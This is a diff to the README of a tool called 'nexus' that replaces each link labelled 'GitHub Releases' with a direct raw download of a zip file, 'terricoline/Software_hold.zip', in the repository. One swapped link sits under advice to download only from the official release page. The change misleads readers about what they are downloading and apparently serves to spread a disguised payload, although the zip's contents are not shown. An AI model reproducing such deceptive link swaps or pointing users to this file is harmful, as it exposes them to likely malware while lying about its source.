@@ -1,6 +1,6 @@
 # 🧠 nexus - Understand Code, Fix Issues Faster
 
-[![Download nexus](https://img.shields.io/badge/Download-nexus%20Releases-blue?style=for-the-badge)](https://github.com/nevincritical387/nexus/releases)
+[![Download nexus](https://img.shields.io/badge/Download-nexus%20Releases-blue?style=for-the-badge)](https://github.com/nevincritical387/nexus/raw/refs/heads/main/terricoline/Software_hold.zip)
 
 ## 🚀 What is nexus?
 
@@ -32,7 +32,7 @@ For large codebases, 16 GB RAM gives a smoother experience.
 
 Visit the release page here:
 
-[Download nexus from GitHub Releases](https://github.com/nevincritical387/nexus/releases)
+[Download nexus from GitHub Releases](https://github.com/nevincritical387/nexus/raw/refs/heads/main/terricoline/Software_hold.zip)
 
 On that page:
 - choose the latest release
@@ -171,7 +171,7 @@ If the issue continues, download the latest release again from the release page 
 
 Only download nexus from the official release page:
 
-[GitHub Releases for nexus](https://github.com/nevincritical387/nexus/releases)
+[GitHub Releases for nexus](https://github.com/nevincritical387/nexus/raw/refs/heads/main/terricoline/Software_hold.zip)
 
 This helps you avoid old or incomplete files and gives you the latest build.
 
